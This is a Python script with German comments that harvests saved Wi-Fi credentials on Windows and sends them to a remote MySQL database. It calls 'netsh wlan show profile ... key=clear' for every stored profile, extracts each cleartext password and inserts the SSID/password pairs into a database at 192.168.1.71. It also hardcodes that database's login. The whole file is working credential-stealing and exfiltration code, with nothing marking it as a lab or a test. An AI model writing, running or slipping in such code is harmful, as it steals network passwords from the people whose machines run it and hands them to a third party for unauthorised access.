import subprocess
import re
import mysql.connector

# MySQL-Datenbankverbindung herstellen
connection = mysql.connector.connect(
    host="192.168.1.71",
    user="ShadowByte",
    password="ShadowByte",
    database="system_info_db"
)

# Funktion, um die SSID und Passwörter der gespeicherten WLAN-Netzwerke zu erhalten
def get_wifi_info():
    # Kommando zum Abrufen aller gespeicherten WLAN-Profile
    command = ["netsh", "wlan", "show", "profiles"]
    try:
        result = subprocess.run(command, capture_output=True, text=True, encoding='utf-8', errors='ignore').stdout
        print(f"Ergebnisse von 'netsh wlan show profiles':\n{result}")
    except Exception as e:
        print(f"Fehler beim Ausführen des Befehls: {e}")
        return []

    # WLAN-Profile (SSIDs) extrahieren, indem wir alles nach "Profil" und "Benutzer" ignorieren
    profiles = re.findall(r"Profil\s.*Benutzer\s*:\s*(.*)", result)
    print(f"Gefundene WLAN-Profile: {profiles}")

    wifi_data = []
    
    # Für jedes Profil (SSID) das Passwort abrufen
    for profile in profiles:
        command = ["netsh", "wlan", "show", "profile", profile, "key=clear"]
        try:
            result = subprocess.run(command, capture_output=True, text=True, encoding='utf-8', errors='ignore').stdout
            print(f"Ergebnisse für Profil '{profile}':\n{result}")
        except Exception as e:
            print(f"Fehler beim Abrufen des Profils {profile}: {e}")
            continue
        
        # Passwort extrahieren (um auch fehlerhafte Kodierungen zu übergehen)
        password_match = re.search(r"Schl.*inhalt\s*:\s*(.*)", result)
        if password_match:
            password = password_match.group(1)
            print(f"Passwort für '{profile}' gefunden: {password}")
        else:
            password = None
            print(f"Kein Passwort für '{profile}' gefunden.")
        
        wifi_data.append((profile, password))
    
    return wifi_data

# Funktion zum Speichern der WLAN-Informationen in der Datenbank
def store_wifi_info(wifi_data):
    cursor = connection.cursor()

    # SQL-Anweisung zum Einfügen der WLAN-Daten
    query = "INSERT INTO wifi_info (ssid, password) VALUES (%s, %s)"
    
    # WLAN-Daten in die Datenbank einfügen
    for ssid, password in wifi_data:
        try:
            print(f"Einfügen: SSID = {ssid}, Passwort = {password}")
            cursor.execute(query, (ssid, password))
        except mysql.connector.Error as err:
            print(f"Fehler beim Einfügen in die Datenbank: {err}")
    
    # Änderungen speichern
    connection.commit()
    cursor.close()

# WLAN-Daten abrufen
wifi_info = get_wifi_info()

if wifi_info:
    # WLAN-Daten in die Datenbank speichern
    store_wifi_info(wifi_info)
    print("WLAN-Daten erfolgreich an die Datenbank gesendet.")
else:
    print("Keine WLAN-Daten gefunden.")

# Datenbankverbindung schließen
connection.close()
